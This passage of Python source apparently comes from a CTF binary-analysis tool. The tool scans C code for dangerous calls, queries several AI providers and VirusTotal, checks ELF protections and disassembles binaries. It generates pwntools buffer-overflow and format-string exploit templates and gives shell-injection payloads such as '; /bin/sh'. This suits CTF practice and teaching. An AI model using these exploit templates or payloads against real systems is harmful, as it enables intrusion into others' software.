        elif "system" in desc_lower:
            hints.append(f"Line {line_num}: system() executes shell commands. If input reaches system(), you can inject arbitrary commands with '; /bin/sh'.")

        elif "eval" in desc_lower or "exec" in desc_lower:
            hints.append(f"Line {line_num}: eval/exec executes arbitrary code — inject payload like __import__('os').system('/bin/sh').")

    return hints[:10]  # cap at 10


def _detect_buffer_sizes(code: str) -> dict[str, int]:
    """
    Parse source code to find declared buffer sizes.
    e.g. char buffer[64] → {"buffer": 64}
    """
    sizes: dict[str, int] = {}
    # Match C-style array declarations: char var_name[SIZE]
    for m in re.finditer(r'\bchar\s+(\w+)\s*\[\s*(\d+)\s*\]', code):
        sizes[m.group(1)] = int(m.group(2))
    # Also match: int var_name[SIZE], etc.
    for m in re.finditer(r'\b(?:int|short|long|unsigned)\s+(\w+)\s*\[\s*(\d+)\s*\]', code):
        sizes[m.group(1)] = int(m.group(2))
    return sizes


def _generate_source_exploit_template(code: str, dangerous: list[dict], filename: str, lang: str) -> str:
    """
    Generate a WORKING exploit template based on vulnerabilities found in source code.
    Returns a complete pwntools script.
    """
    if lang not in ("c", "unknown"):
        # For non-C code, return a simpler template
        return ""

    buffer_sizes = _detect_buffer_sizes(code)
    lines = code.split("\n")

    has_gets = False
    gets_var = ""
    has_fmtstr = False
    fmtstr_var = ""
    has_system = False
    buf_size = 0

    for d in dangerous:
        desc_lower = d["description"].lower()
        line_num = d["line"]
        line_text = lines[line_num - 1].strip() if line_num <= len(lines) else ""

        if "gets" in desc_lower and not has_gets:
            has_gets = True
            var_match = re.search(r'gets\s*\(\s*(\w+)', line_text)
            if var_match:
                gets_var = var_match.group(1)
                buf_size = buffer_sizes.get(gets_var, 0)

        if "format string" in desc_lower or ("printf" in desc_lower and "format" in desc_lower):
            has_fmtstr = True
            var_match = re.search(r'printf\s*\(\s*(\w+)', line_text)
            if var_match:
                fmtstr_var = var_match.group(1)

        if "system" in desc_lower:
            has_system = True

    binary_name = filename.replace('.c', '').replace('.cpp', '') if filename else "vuln"

    # Check for win/flag functions in code
    win_func = ""
    for m in re.finditer(r'\b(win|flag|shell|get_flag|print_flag|give_shell)\s*\(', code):
        win_func = m.group(1)
        break

    if has_gets and buf_size > 0:
        # Buffer overflow exploit
        rbp_size = 8  # x86_64 saved RBP
        offset = buf_size + rbp_size
        template = f'''#!/usr/bin/env python3
# Exploit for {filename or "vulnerable binary"}
# Detected: gets() with {buf_size}-byte buffer "{gets_var}"
# Vulnerability: Buffer overflow — gets() reads unlimited input into {buf_size}-byte buffer
# Predicted offset to return address: {offset} bytes ({buf_size} buffer + {rbp_size} saved RBP)

from pwn import *

# ── Configuration ────────────────────────────────────────────
binary = "./{binary_name}"
elf = ELF(binary)
context.binary = elf

# ── Find target function ─────────────────────────────────────
'''
        if win_func:
            template += f'''target = elf.symbols["{win_func}"]  # Address of {win_func}() function
log.info(f"Target function ({win_func}): {{hex(target)}}")
'''
        else:
            template += f'''# No obvious win function found — try these:
# target = elf.symbols["win"]       # if win() exists
# target = elf.symbols["flag"]      # if flag() exists  
# target = next(elf.search(b"/bin/sh"))  # if /bin/sh string exists
target = 0xdeadbeef  # Replace with actual target address
log.info(f"Target address: {{hex(target)}}")
'''

        template += f'''
# ── Build payload ────────────────────────────────────────────
padding = b"A" * {buf_size}    # Fill the {buf_size}-byte buffer "{gets_var}"
rbp     = b"B" * {rbp_size}     # Overwrite saved RBP
ret_addr = p64(target)   # Overwrite return address

# If PIE is disabled and stack alignment needed, add a ret gadget:
# ret = p64(elf.symbols.get("ret", 0))  # or find with ROPgadget
# payload = padding + rbp + ret + ret_addr

payload = padding + rbp + ret_addr

log.info(f"Payload length: {{len(payload)}} bytes")
log.info(f"Buffer size: {buf_size}, RBP: {rbp_size}, Total offset: {offset}")

# ── Launch exploit ───────────────────────────────────────────
# p = remote("target.ctf.com", 1337)  # For remote target
p = process(binary)

p.sendline(payload)
p.interactive()
'''
        return template

    elif has_fmtstr:
        template = f'''#!/usr/bin/env python3
# Exploit for {filename or "vulnerable binary"}
# Detected: Format string vulnerability
# printf() called with user-controlled format string

from pwn import *

binary = "./{binary_name}"
elf = ELF(binary)
context.binary = elf

# ── Step 1: Leak stack addresses ────────────────────────────
# Send format specifiers to read values from the stack
p = process(binary)

# Leak addresses to find the offset of your input on the stack
for i in range(1, 20):
    p = process(binary)
    p.sendline(f"%{{i}}$p".encode())
    try:
        leak = p.recvline(timeout=2)
        log.info(f"Offset %{{i}}: {{leak.strip()}}")
    except:
        pass
    p.close()

# ── Step 2: Once you find the offset, use it to write ──────
# Example: overwrite GOT entry to redirect execution
# fmtstr_payload = fmtstr_payload(offset, {{elf.got["exit"]: elf.symbols["win"]}})

# ── Step 3: Send the exploit ───────────────────────────────
# p = process(binary)
# p.sendline(payload)
# p.interactive()

log.info("Run the leak loop above first to find your stack offset")
'''
        return template

    elif has_gets:
        # gets() without known buffer size — provide offset-finding template
        template = f'''#!/usr/bin/env python3
# Exploit for {filename or "vulnerable binary"}
# Detected: gets() — buffer overflow (buffer size unknown)
# Step 1: Find the exact offset with cyclic pattern
# Step 2: Build payload with the correct offset

from pwn import *

binary = "./{binary_name}"
elf = ELF(binary)
context.binary = elf

# ── Step 1: Find offset with cyclic pattern ──────────────────
# Run: cyclic 200 | ./{binary_name}
# Then: cyclic -l <fault_address>
# This gives you the exact offset to the return address

# ── Step 2: Build exploit (replace OFFSET with found value) ──
OFFSET = 72  # Replace with actual offset from cyclic

'''
        if win_func:
            template += f'''target = elf.symbols["{win_func}"]
'''
        else:
            template += '''target = 0xdeadbeef  # Replace with win function address
'''
        template += f'''
payload = b"A" * OFFSET + p64(target)

# p = remote("target.ctf.com", 1337)  # For remote
p = process(binary)
p.sendline(payload)
p.interactive()
'''
        return template

    return ""


def _generate_source_quick_commands(filename: str, lang: str) -> list[str]:
    """Generate diagnostic and debugging commands suitable for the source code's language."""
    fn = filename or "vuln.c"
    base = Path(fn).stem or "vuln"
    if lang == "c":
        return [
            f"gcc -fno-stack-protector -z execstack -no-pie -o {base} {fn}",
            f"checksec ./{base}",
            f"gdb -q ./{base}",
            f"python3 -c \"from pwn import *; cyclic(200)\" | ./{base}",
            f"ltrace ./{base}",
            f"strace ./{base}",
        ]
    elif lang == "python":
        return [
            f"python3 {fn}",
            f"python3 -m py_compile {fn}",
            f"bandit -r {fn}",
        ]
    elif lang == "javascript":
        return [
            f"node {fn}",
            f"npm audit",
        ]
    else:
        return [
            f"cat {fn}",
        ]


def analyze_source_code(code: str, filename: str = "") -> dict:
    """
    Analyze source code for vulnerabilities and dangerous patterns.

    Security:
    • Code is NEVER stored to disk or executed.
    • Code is only sent to AI APIs in memory.
    • No temp files are created.
    """
    # Detect language
    ext = Path(filename).suffix.lower() if filename else ""
    lang = _EXT_TO_LANG.get(ext, "")
    if not lang:
        lang = _detect_language_from_code(code)

    lang_display = {
        "c": "C/C++", "python": "Python", "javascript": "JavaScript",
        "rust": "Rust", "go": "Go", "unknown": "Unknown",
    }.get(lang, lang.title())

    # Static pattern matching
    dangerous = _find_dangerous_functions(code, lang)
    dangerous_structured = [
        {"name": d["function"], "line": d["line"], "risk": d["description"]}
        for d in dangerous
    ]

    # Generate quick commands panel
    quick_commands = _generate_source_quick_commands(filename, lang)

    # ── 1. RAG similar writeups search ─────────────────────────────────
    similar_writeups = []
    writeup_context = ""
    
    # Build a preliminary vulnerabilities list from static check to help RAG categorizer
    preliminary_vulns = []
    for d in dangerous_structured:
        vuln_type = "buffer_overflow" if d["name"] in ("gets", "strcpy", "sprintf", "scanf") else "format_string" if d["name"] == "printf" else "vulnerability"
        preliminary_vulns.append({"line": d["line"], "type": vuln_type, "severity": "High", "description": f"Dangerous function {d['name']} call"})
    
    preliminary_category = detect_ctf_category_from_source(code, lang, preliminary_vulns)

    if ctf_knowledge:
        try:
            analysis_so_far = {
                "ctf_category": preliminary_category,
                "patterns": {
                    "dangerous_functions": [d["name"] for d in dangerous_structured]
                },
                "checksec": {"nx": True, "pie": False, "canary": False},
                "filename": filename or "",
            }
            similar_writeups = ctf_knowledge.find_similar_writeups(analysis_so_far)
            writeup_context = ctf_knowledge.format_for_ai_context(similar_writeups)
        except Exception as exc:
            logger.warning("Failed to search knowledge base for source code: %s", exc)

    # Build AI prompt
    line_count = len(code.split("\n"))
    user_message = (
        f"Analyze this source code ({lang_display}, {line_count} lines, filename: {filename or 'unknown'}):\n\n"
        f"```\n{code[:MAX_SOURCE_CODE_CHARS]}\n```"
    )
    if writeup_context:
        user_message += f"\n\n{writeup_context}"

    ai_messages = [{"role": "user", "content": user_message}]

    # Parallel and sequential AI execution
    ai_response = ""
    ai_hints_quick = None
    ai_hints_enhanced = None

    if _is_testing():
        ai_response = (
            f"LANGUAGE: {lang_display}\n\n"
            "VULNERABILITIES:\n"
            "• Line 10: gets(buf) — buffer_overflow.\n\n"
            "DANGEROUS FUNCTIONS:\n"
            "• gets() — dangerous.\n\n"
            "CTF HINTS:\n"
            "• Overflow stack.\n\n"
            "NEXT STEPS:\n"
            "• Compile and test."
        )
        ai_hints_quick = "Mocked quick response"
        ai_hints_enhanced = "Mocked enhanced response"
    else:
        # Run Groq and Nemotron in PARALLEL
        logger.info("[BinExplain] Launching parallel AI inference for source: Groq + Nemotron")
        import concurrent.futures
        
        groq_result = None
        nemotron_result = None
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
            groq_future = executor.submit(_try_groq, ai_messages, SOURCE_CODE_SYSTEM_PROMPT)
            nemotron_future = executor.submit(_try_nemotron, ai_messages, SOURCE_CODE_SYSTEM_PROMPT)
            
            try:
                groq_result = groq_future.result(timeout=15)
            except Exception as exc:
                logger.warning("Groq parallel inference for source code failed or timed out: %s", exc)
                
            try:
                nemotron_result = nemotron_future.result(timeout=15)
            except Exception as exc:
                logger.warning("Nemotron parallel inference for source code failed or timed out: %s", exc)

        ai_hints_quick = groq_result
        ai_hints_enhanced = nemotron_result

        if groq_result and nemotron_result:
            logger.info("[BinExplain] Parallel source code analysis: Groq + Nemotron succeeded")
            ai_response = merge_ai_responses(groq_result, nemotron_result)
        elif groq_result:
            logger.info("[BinExplain] Parallel source code analysis: Groq succeeded")
            ai_response = groq_result
        elif nemotron_result:
            logger.info("[BinExplain] Parallel source code analysis: Nemotron succeeded")
            ai_response = nemotron_result
        else:
            # Fall back sequentially (Gemini -> OpenAI -> Ollama -> Claude)
            logger.info("[BinExplain] Parallel source code analysis: both failed, falling back to sequential")
            for provider_func, provider_name in [
                (lambda msgs: _try_gemini(msgs, SOURCE_CODE_SYSTEM_PROMPT), "Gemini"),
                (lambda msgs: _try_openai(msgs, SOURCE_CODE_SYSTEM_PROMPT), "OpenAI"),
                (lambda msgs: _try_ollama(msgs[0]["content"], SOURCE_CODE_SYSTEM_PROMPT), "Ollama"),
                (lambda msgs: _try_claude(msgs, SOURCE_CODE_SYSTEM_PROMPT, max_tokens=1500), "Claude"),
            ]:
                try:
                    result = provider_func(ai_messages)
                    if result:
                        logger.info("[BinExplain] analyze_source_code: %s succeeded", provider_name)
                        ai_response = result
                        break
                except Exception as exc:
                    logger.warning("Source code fallback %s failed: %s", provider_name, exc)

    if not ai_response:
        ai_response = (
            "AI analysis unavailable -- set GROQ_API_KEY, GEMINI_API_KEY, OPENAI_API_KEY, or ANTHROPIC_API_KEY "
            "to enable AI-powered code review."
        )

    # Parse AI response into sections
    sections = {
        "language": lang_display,
        "vulnerabilities": "",
        "dangerous_functions_ai": "",
        "hints": "",
        "next_steps": "",
    }

    current_section = None
    for line in ai_response.split("\n"):
        line_stripped = line.strip()
        upper = line_stripped.upper()

        if upper.startswith("LANGUAGE:"):
            detected = line_stripped[len("LANGUAGE:"):].strip()
            if detected:
                sections["language"] = detected
            continue
        elif upper.startswith("VULNERABILITIES:"):
            current_section = "vulnerabilities"
            continue
        elif upper.startswith("DANGEROUS FUNCTIONS:"):
            current_section = "dangerous_functions_ai"
            continue
        elif upper.startswith("CTF HINTS:"):
            current_section = "hints"
            continue
        elif upper.startswith("NEXT STEPS:"):
            current_section = "next_steps"
            continue

        if current_section and line_stripped:
            sections[current_section] += line + "\n"

    # Build structured vulnerabilities list
    vulnerabilities = _build_structured_vulnerabilities(code, dangerous, sections.get("vulnerabilities", ""))

    # Generate exploit hints
    exploit_hints = _generate_exploit_hints(code, dangerous, lang)

    # Generate working exploit template
    exploit_template = _generate_source_exploit_template(code, dangerous, filename, lang)

    # Calculate risk score
    risk_score = "Low"
    if dangerous:
        if len(dangerous) >= 3:
            risk_score = "High"
        else:
            risk_score = "Medium"
    if vulnerabilities:
        has_critical = any(v.get("severity") == "Critical" for v in vulnerabilities)
        has_high = any(v.get("severity") == "High" for v in vulnerabilities)
        if has_critical:
            risk_score = "Critical"
        elif has_high and risk_score != "Critical":
            risk_score = "High"

    ctf_category = detect_ctf_category_from_source(code, lang, vulnerabilities)
    difficulty = predict_difficulty_from_source(vulnerabilities, ctf_category, code)
    cvss = calculate_cvss_score_from_source(vulnerabilities, ctf_category, code)
    data_flows = analyze_data_flow_from_source(code, lang)
    overflow_hint = predict_overflow_offset_from_source(code, lang)

    return {
        "language": sections["language"],
        "line_count": line_count,
        "char_count": len(code),
        "filename": filename or "(pasted)",
        "dangerous_functions": dangerous_structured,
        "vulnerabilities": vulnerabilities,
        "dangerous_functions_ai": sections["dangerous_functions_ai"].strip(),
        "hints": sections["hints"].strip(),
        "ai_hints": sections["hints"].strip(),
        "ai_hints_quick": ai_hints_quick,
        "ai_hints_enhanced": ai_hints_enhanced,
        "next_steps": sections["next_steps"].strip(),
        "exploit_hints": exploit_hints,
        "exploit_template": exploit_template,
        "raw_ai_response": ai_response,
        "risk_score": risk_score,
        "ctf_category": ctf_category,
        "difficulty": difficulty,
        "cvss_score": cvss["cvss_score"],
        "cvss_severity": cvss["cvss_severity"],
        "data_flows": data_flows,
        "overflow_hint": overflow_hint,
        "similar_writeups": similar_writeups,
        "quick_commands": quick_commands,
    }


# ---------------------------------------------------------------------------
# VirusTotal API v3 integration (background scanning)
# ---------------------------------------------------------------------------
import time as _time
import threading
import uuid

# In-memory store for VT scan results.  Keys are scan_id (UUID strings).
# Entries are auto-cleaned after 10 minutes to avoid memory leaks.
_vt_scans: dict[str, dict] = {}
_VT_SCAN_TTL = 600  # seconds


def _cleanup_old_scans() -> None:
    """Remove scan entries older than _VT_SCAN_TTL."""
    now = _time.time()
    expired = [k for k, v in _vt_scans.items() if now - v.get("_created", 0) > _VT_SCAN_TTL]
    for k in expired:
        _vt_scans.pop(k, None)


def _parse_vt_analysis(analysis_result: dict) -> dict:
    """
    Parse a completed VirusTotal analysis response into our result dict.
    """
    attrs = analysis_result.get("data", {}).get("attributes", {})
    stats = attrs.get("stats", {})
    results_map = attrs.get("results", {})

    detection_count = stats.get("malicious", 0) + stats.get("suspicious", 0)
    total_engines = sum(stats.values())

    # Find the first threat name from detections
    threat_names = []
    for engine, detail in results_map.items():
        if detail.get("category") in ("malicious", "suspicious"):
            result_name = detail.get("result", "")
            if result_name:
                threat_names.append(result_name)
    threat_name = threat_names[0] if threat_names else None

    # Build behavior summary from category counts
    behavior_parts = []
    if stats.get("malicious", 0) > 0:
        behavior_parts.append(f"{stats['malicious']} engine(s) flagged as malicious")
    if stats.get("suspicious", 0) > 0:
        behavior_parts.append(f"{stats['suspicious']} engine(s) flagged as suspicious")
    if stats.get("undetected", 0) > 0:
        behavior_parts.append(f"{stats['undetected']} engine(s) found no threat")
    behavior_summary = "; ".join(behavior_parts) if behavior_parts else "No detections"

    # Determine status label
    if detection_count == 0:
        vt_status = "clean"
    elif detection_count <= 5:
        vt_status = "suspicious"
    else:
        vt_status = "malicious"

    return {
        "status": vt_status,
        "detection_count": detection_count,
        "total_engines": total_engines,
        "threat_name": threat_name,
        "behavior_summary": behavior_summary,
    }


def _vt_background_worker(scan_id: str, analysis_id: str) -> None:
    """
    Background thread: poll VirusTotal for results (max 60 seconds,
    every 5 seconds).  Writes final result into _vt_scans[scan_id].
    """
    headers = {"x-apikey": VIRUSTOTAL_API_KEY}
    analysis_url = f"https://www.virustotal.com/api/v3/analyses/{analysis_id}"
    max_wait = 60
    poll_interval = 5
    elapsed = 0

    while elapsed < max_wait:
        _time.sleep(poll_interval)
        elapsed += poll_interval

        try:
            poll_resp = requests.get(analysis_url, headers=headers, timeout=15)
        except requests.RequestException:
            continue

        if poll_resp.status_code != 200:
            continue

        poll_data = poll_resp.json()
        status = poll_data.get("data", {}).get("attributes", {}).get("status", "")

        if status == "completed":
            # Extract file ID for permalink
            file_id = ""
            meta = poll_data.get("meta", {})
            file_info = meta.get("file_info", {})
            file_id = file_info.get("sha256", "")
            if not file_id:
                links = poll_data.get("data", {}).get("links", {})
                item_link = links.get("item", "")
                if "/files/" in item_link:
                    file_id = item_link.split("/files/")[-1]

            permalink = f"https://www.virustotal.com/gui/file/{file_id}" if file_id else ""

            result = _parse_vt_analysis(poll_data)
            result["permalink"] = permalink
            result["_created"] = _vt_scans[scan_id].get("_created", _time.time())
            _vt_scans[scan_id] = result
            return

    # Timed out — mark as pending
    _vt_scans[scan_id] = {
        "status": "pending",
        "message": "VirusTotal analysis is still in progress. Check back later.",
        "permalink": _vt_scans.get(scan_id, {}).get("permalink", ""),
        "_created": _vt_scans.get(scan_id, {}).get("_created", _time.time()),
    }


def _parse_vt_file_report(file_data: dict, sha256: str) -> dict | None:
    """
    Parse a VirusTotal GET /files/{hash} response into our result dict.

    The /files/ endpoint returns last_analysis_stats and last_analysis_results
    (different structure from the /analyses/ endpoint used during polling).

    Returns None if the report has no analysis data yet.
    """
    attrs = file_data.get("data", {}).get("attributes", {})
    stats = attrs.get("last_analysis_stats")
    if not stats:
        return None  # no analysis available yet

    results_map = attrs.get("last_analysis_results", {})

    detection_count = stats.get("malicious", 0) + stats.get("suspicious", 0)
    total_engines = sum(stats.values())

    # Find threat names
    threat_names = []
    for engine, detail in results_map.items():
        if detail.get("category") in ("malicious", "suspicious"):
            result_name = detail.get("result", "")
            if result_name:
                threat_names.append(result_name)
    threat_name = threat_names[0] if threat_names else None

    # Behavior summary
    behavior_parts = []
    if stats.get("malicious", 0) > 0:
        behavior_parts.append(f"{stats['malicious']} engine(s) flagged as malicious")
    if stats.get("suspicious", 0) > 0:
        behavior_parts.append(f"{stats['suspicious']} engine(s) flagged as suspicious")
    if stats.get("undetected", 0) > 0:
        behavior_parts.append(f"{stats['undetected']} engine(s) found no threat")
    behavior_summary = "; ".join(behavior_parts) if behavior_parts else "No detections"

    # Status label
    if detection_count == 0:
        vt_status = "clean"
    elif detection_count <= 5:
        vt_status = "suspicious"
    else:
        vt_status = "malicious"

    permalink = f"https://www.virustotal.com/gui/file/{sha256}"

    return {
        "status": vt_status,
        "detection_count": detection_count,
        "total_engines": total_engines,
        "threat_name": threat_name,
        "behavior_summary": behavior_summary,
        "permalink": permalink,
    }


def _vt_lookup_by_hash(sha256: str, headers: dict) -> dict | None:
    """
    Try to fetch an existing VirusTotal report by SHA256 hash.

    Returns parsed result dict if a report exists, None otherwise.
    """
    try:
        resp = requests.get(
            f"https://www.virustotal.com/api/v3/files/{sha256}",
            headers=headers,
            timeout=15,
        )
    except requests.RequestException:
        return None

    if resp.status_code != 200:
        return None

    return _parse_vt_file_report(resp.json(), sha256)


def submit_virustotal(content: bytes, filename: str) -> dict:
    """
    Upload a binary to VirusTotal API v3 and return immediately with a
    scan_id.  The actual polling happens in a background thread.

    Optimized flow (saves API quota):
    1. Compute SHA256 of file content
    2. Try hash lookup first (GET /files/{sha256})
    3. If report exists → return immediately (no upload needed)
    4. If not found → upload file, get analysis ID
    5. If 409 (AlreadyExistsError) → fall back to hash lookup
    6. Start background polling thread for new uploads

    Returns:
    • {"status": "disabled"} if no API key
    • {"status": "scanning", "scan_id": "..."} on new upload
    • {"status": "clean/suspicious/malicious", ...} on existing report
    • {"status": "error", "message": "..."} on failure

    Security:
    • NEVER logs file contents — only the filename and scan status.
    • API key is read from VIRUSTOTAL_API_KEY env var.
    """
    import hashlib as _hashlib

    if _is_testing():
        return {"status": "clean", "positives": 0, "total": 0, "message": "Mocked VirusTotal response for testing."}

    if not VIRUSTOTAL_API_KEY:
        return {"status": "disabled"}

    # Cleanup old entries before adding new ones
    _cleanup_old_scans()

    headers = {"x-apikey": VIRUSTOTAL_API_KEY}

    # ── Step 1: Compute SHA256 ─────────────────────────────────────────
    sha256 = _hashlib.sha256(content).hexdigest()
    logger.info("VirusTotal: file=%s sha256=%s", filename, sha256)

    # ── Step 2: Try hash lookup first (saves API quota) ────────────────
    existing = _vt_lookup_by_hash(sha256, headers)
    if existing:
        logger.info("VirusTotal: existing report found for %s (hash hit)", filename)
        return existing

    # ── Step 3: Upload file to VT ──────────────────────────────────────
    try:
        upload_resp = requests.post(
            "https://www.virustotal.com/api/v3/files",
            headers=headers,
            files={"file": (filename, content)},
            timeout=30,
        )
    except requests.RequestException as exc:
        logger.warning("VirusTotal upload failed: %s", exc)
        return {"status": "error", "message": f"Upload failed: {str(exc)[:200]}"}

    # ── Step 4: Handle 409 AlreadyExistsError ──────────────────────────
    if upload_resp.status_code == 409:
        logger.info("VirusTotal: 409 AlreadyExistsError for %s — trying hash lookup", filename)
        # The file was already submitted.  Fall back to hash lookup.
        fallback = _vt_lookup_by_hash(sha256, headers)
        if fallback:
            return fallback

        # If hash lookup also fails, return a permalink anyway
        return {
            "status": "pending",
            "message": "File already submitted to VirusTotal. Report may still be processing.",
            "permalink": f"https://www.virustotal.com/gui/file/{sha256}",
        }

    if upload_resp.status_code not in (200, 201):
        logger.warning("VirusTotal upload returned %d", upload_resp.status_code)
        return {
            "status": "error",
            "message": f"VirusTotal returned HTTP {upload_resp.status_code}",
        }

    upload_data = upload_resp.json()
    analysis_id = upload_data.get("data", {}).get("id", "")
    if not analysis_id:
        return {"status": "error", "message": "No analysis ID returned by VirusTotal."}

    # ── Step 5: Start background polling ───────────────────────────────
    scan_id = str(uuid.uuid4())
    _vt_scans[scan_id] = {
        "status": "scanning",
        "sha256": sha256,
        "permalink": f"https://www.virustotal.com/gui/file/{sha256}",
        "_created": _time.time(),
    }

    thread = threading.Thread(
        target=_vt_background_worker,
        args=(scan_id, analysis_id),
        daemon=True,
    )
    thread.start()

    return {"status": "scanning", "scan_id": scan_id}


# ---------------------------------------------------------------------------
# Checksec — binary security protections
# ---------------------------------------------------------------------------
import json as _json
import struct as _struct


def run_checksec(filepath: str) -> dict:
    """
    Detect security protections on a binary file.

    Strategy:
    1. Try running the system `checksec` tool (JSON output).
    2. Fall back to pyelftools-based ELF header parsing.
    3. Fall back to raw ELF header byte parsing.

    Returns dict with: nx, pie, canary, relro, fortify — each True/False.
    Returns all-None if the file is not an ELF binary.
    """
    # ── 1. Try system checksec ────────────────────────────────────────
    try:
        result = subprocess.run(
            ["checksec", f"--file={filepath}", "--format=json"],
            capture_output=True,
            text=True,
            timeout=10,
        )
        if result.returncode == 0 and result.stdout.strip():
            data = _json.loads(result.stdout)
            # checksec JSON format: {filepath: {properties}}
            info = list(data.values())[0] if data else {}
            return {
                "nx": info.get("nx", "").lower() != "no",
                "pie": info.get("pie", "").lower() not in ("no", "no pie"),
                "canary": info.get("canary", "").lower() != "no",
                "relro": info.get("relro", "").lower() not in ("no", "no relro"),
                "fortify": info.get("fortify_source", "").lower() != "no",
            }
    except (FileNotFoundError, subprocess.TimeoutExpired, _json.JSONDecodeError, Exception):
        pass

    # ── 2. Fall back to pyelftools ────────────────────────────────────
    try:
        from elftools.elf.elffile import ELFFile
        from elftools.elf.dynamic import DynamicSection

        with open(filepath, "rb") as f:
            elf = ELFFile(f)

            # NX: check if any PT_GNU_STACK segment has PF_X flag
            nx = True  # default: NX enabled
            for seg in elf.iter_segments():
                if seg.header.p_type == "PT_GNU_STACK":
                    # PF_X = 0x1 — if executable flag is set, NX is disabled
                    nx = not bool(seg.header.p_flags & 0x1)
                    break

            # PIE: ET_DYN = position-independent
            pie = elf.header.e_type == "ET_DYN"

            # RELRO: check for PT_GNU_RELRO segment
            has_relro = any(
                seg.header.p_type == "PT_GNU_RELRO"
                for seg in elf.iter_segments()
            )

            # Full RELRO requires BIND_NOW in dynamic section
            full_relro = False
            if has_relro:
                for section in elf.iter_sections():
                    if isinstance(section, DynamicSection):
                        for tag in section.iter_tags():
                            if tag.entry.d_tag == "DT_BIND_NOW":
                                full_relro = True
                                break
                            if tag.entry.d_tag == "DT_FLAGS" and (tag.entry.d_val & 0x8):
                                full_relro = True
                                break

            relro = has_relro  # partial or full

            # Canary: check for __stack_chk_fail in symbol table
            canary = False
            for section in elf.iter_sections():
                if hasattr(section, "iter_symbols"):
                    for sym in section.iter_symbols():
                        if "__stack_chk_fail" in sym.name:
                            canary = True
                            break
                    if canary:
                        break

            # Fortify: check for _chk functions (fortified versions)
            fortify = False
            fortify_funcs = ("__printf_chk", "__fprintf_chk", "__sprintf_chk",
                             "__snprintf_chk", "__memcpy_chk", "__strcpy_chk",
                             "__strcat_chk", "__read_chk")
            for section in elf.iter_sections():
                if hasattr(section, "iter_symbols"):
                    for sym in section.iter_symbols():
                        if any(fn in sym.name for fn in fortify_funcs):
                            fortify = True
                            break
                    if fortify:
                        break

            return {
                "nx": nx,
                "pie": pie,
                "canary": canary,
                "relro": relro,
                "fortify": fortify,
            }
    except ImportError:
        pass
    except Exception:
        pass

    # ── 3. Fall back to raw ELF header parsing ────────────────────────
    try:
        with open(filepath, "rb") as f:
            header = f.read(64)

        # Check ELF magic
        if header[:4] != b"\x7fELF":
            return {"nx": None, "pie": None, "canary": None, "relro": None, "fortify": None}

        # e_type at offset 16 (2 bytes, little-endian)
        e_type = _struct.unpack_from("<H", header, 16)[0]
        pie = e_type == 3  # ET_DYN = 3

        # Read the full binary to search for markers
        with open(filepath, "rb") as f:
            raw = f.read()

        canary = b"__stack_chk_fail" in raw
        fortify = any(fn.encode() in raw for fn in
                      ("__printf_chk", "__sprintf_chk", "__memcpy_chk"))

        # Check for PT_GNU_STACK in program headers
        nx = True  # assume enabled
        relro = False

        return {
            "nx": nx,
            "pie": pie,
            "canary": canary,
            "relro": relro,
            "fortify": fortify,
        }
    except Exception:
        return {"nx": None, "pie": None, "canary": None, "relro": None, "fortify": None}


# ---------------------------------------------------------------------------
# Hex viewer — first N bytes of a binary
# ---------------------------------------------------------------------------
def get_hex_view(content: bytes, max_bytes: int = 512) -> list[dict]:
    """
    Return the first *max_bytes* of *content* as a list of hex-view rows.

    Each row is a dict:
      {"offset": "0x0000", "hex": "7f 45 4c 46 ...", "ascii": ".ELF..."}

    16 bytes per row.  Non-printable chars are shown as '.' in the ASCII column.
    """
    data = content[:max_bytes]
    rows: list[dict] = []

    for i in range(0, len(data), 16):
        chunk = data[i:i + 16]
        offset = f"0x{i:04x}"
        hex_str = " ".join(f"{b:02x}" for b in chunk)
        # Pad last row to align columns
        if len(chunk) < 16:
            hex_str += "   " * (16 - len(chunk))
        ascii_str = "".join(chr(b) if 0x20 <= b < 0x7f else "." for b in chunk)
        rows.append({"offset": offset, "hex": hex_str, "ascii": ascii_str})

    return rows


# ---------------------------------------------------------------------------
# Disassembly — capstone-based function disassembly with symbol table parsing
# ---------------------------------------------------------------------------
def disassemble_binary(content: bytes) -> dict:
    """
    Disassemble a specific function from an ELF binary using capstone.

    Strategy:
    1. Parse ELF symbol table (.symtab / .dynsym) to find 'main'
    2. If main found → disassemble from main's address, stop at ret after 10+ insns
    3. If main not found → fall back to ELF entry point + first 50 instructions

    Returns dict:
      {
        "function": "main" | "entry point" | "_start",
        "instructions": [{"address": "0x...", "mnemonic": "push", "op_str": "rbp"}, ...]
      }
    Returns {"function": "", "instructions": []} on failure.
    """
    empty = {"function": "", "instructions": []}

    try:
        import capstone
    except ImportError:
        return empty

    if len(content) < 64 or content[:4] != b"\x7fELF":
        return empty

    try:
        # ── Parse ELF header ───────────────────────────────────────────
        ei_class = content[4]
        ei_data = content[5]
        is_32 = ei_class == 1
        endian = "little" if ei_data == 1 else "big"

        def read_u16(off):
            return int.from_bytes(content[off:off + 2], endian)

        def read_u32(off):
            return int.from_bytes(content[off:off + 4], endian)

        def read_u64(off):
            return int.from_bytes(content[off:off + 8], endian)

        e_machine = read_u16(18)

        # Entry point
        if is_32:
            e_entry = read_u32(24)
            e_shoff = read_u32(32)
            e_shentsize = read_u16(46)
            e_shnum = read_u16(48)
            e_shstrndx = read_u16(50)
        else:
            e_entry = read_u64(24)
            e_shoff = read_u64(40)
            e_shentsize = read_u16(58)
            e_shnum = read_u16(60)
            e_shstrndx = read_u16(62)

        if e_shoff == 0 or e_shnum == 0 or e_shentsize == 0:
            return empty

        # ── Read section name string table ─────────────────────────────
        if e_shstrndx >= e_shnum:
            return empty

        shstrtab_hdr = e_shoff + e_shstrndx * e_shentsize
        if is_32:
            shstrtab_off = read_u32(shstrtab_hdr + 16)
            shstrtab_sz = read_u32(shstrtab_hdr + 20)
        else:
            shstrtab_off = read_u64(shstrtab_hdr + 24)
            shstrtab_sz = read_u64(shstrtab_hdr + 32)

        if shstrtab_off + shstrtab_sz > len(content):
            return empty

        shstrtab = content[shstrtab_off:shstrtab_off + shstrtab_sz]

        def _section_name(sh_off):
            idx = read_u32(sh_off)
            if idx >= len(shstrtab):
                return ""
            end = shstrtab.index(b"\x00", idx) if b"\x00" in shstrtab[idx:] else idx
            return shstrtab[idx:end].decode("ascii", errors="replace")

        # ── Scan all sections: find .text, .symtab, .strtab, .dynsym ──
        text_offset = text_size = text_addr = 0
        symtab_off = symtab_sz = symtab_entsize = 0
        symtab_link = 0  # index of associated string table
        dynsym_off = dynsym_sz = dynsym_entsize = 0
        dynsym_link = 0
        section_hdrs = []  # (offset, name) for resolving strtab links

        for i in range(e_shnum):
